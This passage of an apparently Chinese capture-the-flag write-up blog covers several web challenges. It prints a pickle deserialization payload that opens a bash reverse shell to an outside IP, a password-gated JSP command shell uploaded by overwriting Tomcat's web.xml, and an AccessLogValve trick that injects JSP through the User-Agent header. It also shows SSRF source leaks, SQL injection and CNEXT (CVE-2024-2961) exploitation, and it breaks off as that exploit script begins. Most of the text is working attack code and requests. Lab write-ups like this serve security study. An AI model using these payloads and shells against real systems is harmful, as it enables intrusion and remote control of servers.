class="hljs-built_in">isinstance</span>(s, unicode) <span class="hljs-keyword">else</span> <span class="hljs-built_in">bytes</span>(s)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_cookie</span>(<span class="hljs-params">key, default=<span class="hljs-literal">None</span>, secret=<span class="hljs-literal">None</span></span>):<br>    value = request.cookies.get(key)<br>    <span class="hljs-keyword">if</span> secret <span class="hljs-keyword">and</span> value:<br>        dec = cookie_decode(value, secret)<br>        <span class="hljs-keyword">return</span> dec[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> dec <span class="hljs-keyword">and</span> dec[<span class="hljs-number">0</span>] == key <span class="hljs-keyword">else</span> default<br>    <span class="hljs-keyword">return</span> value <span class="hljs-keyword">or</span> default<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cookie_is_encoded</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(data.startswith(tob(<span class="hljs-string">&#x27;!&#x27;</span>)) <span class="hljs-keyword">and</span> tob(<span class="hljs-string">&#x27;?&#x27;</span>) <span class="hljs-keyword">in</span> data)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_lscmp</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">sum</span>(<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> x == y <span class="hljs-keyword">else</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> x, y <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(a, b)) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(a) == <span class="hljs-built_in">len</span>(b)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_cookie</span>(<span class="hljs-params">name, value, secret=<span class="hljs-literal">None</span>, **options</span>):<br>    <span class="hljs-keyword">if</span> secret:<br>        value = touni(cookie_encode((name, value), secret))<br>        resp = make_response(<span class="hljs-string">&quot;success&quot;</span>)<br>        resp.set_cookie(<span class="hljs-string">&quot;user&quot;</span>, value, max_age=<span class="hljs-number">3600</span>)<br>        <span class="hljs-keyword">return</span> resp<br>    <span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(value, basestring):<br>        <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">&#x27;Secret key missing for non-string Cookie.&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(value) &gt; <span class="hljs-number">4096</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&#x27;Cookie value to long.&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">touni</span>(<span class="hljs-params">s, enc=<span class="hljs-string">&#x27;utf8&#x27;</span>, err=<span class="hljs-string">&#x27;strict&#x27;</span></span>):<br>    <span class="hljs-keyword">return</span> s.decode(enc, err) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>) <span class="hljs-keyword">else</span> unicode(s)<br></code></pre></td></tr></table></figure><p>其中<code>/board</code>路由会读取cookie，并进行一次<code>pickle.loads</code></p><p>在本地制作一个cookie后复制到靶机即可实现pickle反序列化</p><p>waf很宽松，约等于没有，使用i执行反弹shell即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cookie<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><br>secret_code = <span class="hljs-string">&quot;EnjoyThePlayTime123456&quot;</span><br>app = Flask(__name__)<br>payload = <span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/47.99.77.52/8888 0&gt;&amp;1&quot;&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> cookie.set_cookie(<span class="hljs-string">&quot;user&quot;</span>, payload, secret=secret_code)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run()<br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-ycb-c-Lyrics-For-You-1.png"></p><h2 id="tomtom2"><a href="#tomtom2" class="headerlink" title="tomtom2"></a>tomtom2</h2><p>题目给了一个只能读xml文件的接口</p><p>那就去读tomcat的配置文件</p><p><code>/myapp/read?filename=conf/tomcat-users.xml</code></p><p>tomcat-users中存在后台账号密码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">username</span>=<span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;This_is_my_favorite_passwd&quot;</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&quot;manager-gui&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>登录后有一个文件上传，测试后发现只能上传xml文件，同时上传的<code>path</code>参数是可控的</p><p>那么可以覆盖靶机的<code>WEB-INF/web.xml</code>文件来自定义一个Servlet</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>shell<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">jsp-file</span>&gt;</span>/WEB-INF/1.xml<span class="hljs-tag">&lt;/<span class="hljs-name">jsp-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>shell<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/shell<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-ycb-c-tomtom2-1.png"></p><p>然后再传一个1.xml小马</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*,java.io.*&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;%!<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">excuteCmd</span><span class="hljs-params">(String c)</span><br>&#123;<br>    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><span class="hljs-keyword">try</span><br>&#123;<br>    <span class="hljs-type">Process</span> <span class="hljs-variable">pro</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(c);<br>    <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">buf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(pro.getInputStream()));<br>    <span class="hljs-type">String</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">while</span> ((temp = buf.readLine()) != <span class="hljs-literal">null</span>)<br>    &#123;<br>        line.append(temp+<span class="hljs-string">&quot;\\n&quot;</span>);<br>    &#125;<br>    buf.close();<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception e)<br>&#123;<br>    line.append(e.getMessage());<br>&#125;<br><span class="hljs-keyword">return</span> line.toString();<br>&#125;<br>%&gt;<br>&lt;%<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;023&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>))&amp;&amp;!<span class="hljs-string">&quot;&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)))<br>&#123;<br>    out.println(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>+excuteCmd(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>))+<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    out.println(<span class="hljs-string">&quot;:-)&quot;</span>);<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-ycb-c-tomtom2-2.png"></p><p>然后访问<code>/myapp/shell</code>即可rce</p><p><img src="/img/wp/2024/2024-ycb-c-tomtom2-3.png"></p><h2 id="tomtom2-revenge"><a href="#tomtom2-revenge" class="headerlink" title="tomtom2_revenge"></a>tomtom2_revenge</h2><p>前面和tomtom2一样，只是不能上传web.xml了，但还能上传其他xml，这样可以传一份context.xml</p><p>通过设置日志路径来写入jsp文件</p><p><img src="/img/wp/2024/2024-ycb-c-tomtom2_revenge-1.png"></p><p>修改下得到</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Context</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Valve</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span> <span class="hljs-attr">directory</span>=<span class="hljs-string">&quot;/opt/tomcat/webapps/myapp/&quot;</span> <span class="hljs-attr">prefix</span>=<span class="hljs-string">&quot;log&quot;</span> <span class="hljs-attr">suffix</span>=<span class="hljs-string">&quot;.jsp&quot;</span> <span class="hljs-attr">pattern</span>=<span class="hljs-string">&quot;%&#123;User-Agent&#125;i&quot;</span> <span class="hljs-attr">resolveHosts</span>=<span class="hljs-string">&quot;false&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Context</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后上传，这里要注意上传到META-INF目录中，而不是WEB-INF目录</p><p>再访问一次，User-Agent中带上jsp代码即可</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/myapp/upload.html</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>139.155.126.78:31506<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>&lt;%= new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter(request.getParameterMap().keySet().toArray(new String[0])[0])).getInputStream()).useDelimiter(request.getParameter(request.getParameterMap().keySet().toArray(new String[0])[1])).next() %&gt;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://139.155.126.78:31506/myapp/login.html<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=1C384267B4E8256CC990EE792436ECBA<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><br></code></pre></td></tr></table></figure><p>然后请求<code>/myapp/log.2024-08-28.jsp?cmd=ls&amp;1=%5CA</code></p><p><img src="/img/wp/2024/2024-ycb-c-tomtom2_revenge-2.png"></p><h2 id="网络照相馆"><a href="#网络照相馆" class="headerlink" title="网络照相馆"></a>网络照相馆</h2><p>ssrf拿到源码</p><p><code>file://localhost/var/www/html/url.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//error_reporting(0);</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&#x27;function.php&#x27;</span>;<br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&#x27;sql.php&#x27;</span>;<br><br><span class="hljs-variable">$baseDir</span> = <span class="hljs-string">&quot;data/&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$parse</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>]))<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;url错误！&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$url</span>);<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$baseDir</span> .  <span class="hljs-title function_ invoke__">get_filename</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span> , <span class="hljs-variable">$data</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$filename</span>, <span class="hljs-variable">$url</span>))&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span> , <span class="hljs-variable">$data</span>);<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO `data`(`url`,`filename`) VALUES (?, ?)&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$stmt</span> = <span class="hljs-title function_ invoke__">mysqli_prepare</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>))&#123;<br>            <span class="hljs-title function_ invoke__">mysqli_stmt_bind_param</span>(<span class="hljs-variable">$stmt</span>, <span class="hljs-string">&quot;ss&quot;</span>, <span class="hljs-variable">$url</span>, <span class="hljs-variable">$filename</span>);<br>            <span class="hljs-title function_ invoke__">mysqli_stmt_execute</span>(<span class="hljs-variable">$stmt</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>file://localhost/var/www/html/function.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-variable">$curl</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$tmpInfo</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curl</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curl</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$tmpInfo</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_filename</span>(<span class="hljs-params"><span class="hljs-variable">$len</span></span>)</span>&#123;<br>    <span class="hljs-variable">$chars</span> = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span>;<br>    <span class="hljs-variable">$var_size</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$chars</span>);<br>    <span class="hljs-variable">$res</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span>( <span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$x</span> &lt; <span class="hljs-variable">$len</span>; <span class="hljs-variable">$x</span>++ ) &#123;<br>        <span class="hljs-variable">$random_str</span>= <span class="hljs-variable">$chars</span>[ <span class="hljs-title function_ invoke__">rand</span>( <span class="hljs-number">0</span>, <span class="hljs-variable">$var_size</span> - <span class="hljs-number">1</span> ) ];<br>        <span class="hljs-variable">$res</span> .= <span class="hljs-variable">$random_str</span>;<br>    &#125;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d&quot;</span>). <span class="hljs-string">&#x27;_&#x27;</span> . <span class="hljs-variable">$res</span> . <span class="hljs-string">&#x27;.txt&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$conn</span> , <span class="hljs-variable">$filename</span>, <span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT filename from data where url = &#x27;<span class="hljs-subst">$url</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>        <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_all</span>(<span class="hljs-variable">$result</span>);<br>        <span class="hljs-keyword">foreach</span> ( <span class="hljs-variable">$row</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>)&#123;<br>            <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$filename</span>) === <span class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$value</span>[<span class="hljs-number">0</span>]))&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>公告提示说注意hash_file函数，那就很明显可以配合sql注入打hash_file的 CNEXT (CVE-2024-2961)</p><p>调整后的exp</p><p>1：在Remote类中修改读取文件的逻辑，本题中用file:&#x2F;&#x2F;localhost读取&#x2F;proc&#x2F;self&#x2F;maps和libc<br>2：修改exploit的path，搭配sql注入发送payload给hash_file<br>3：注释掉<code>self.check_vulnerable()</code>的判断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span 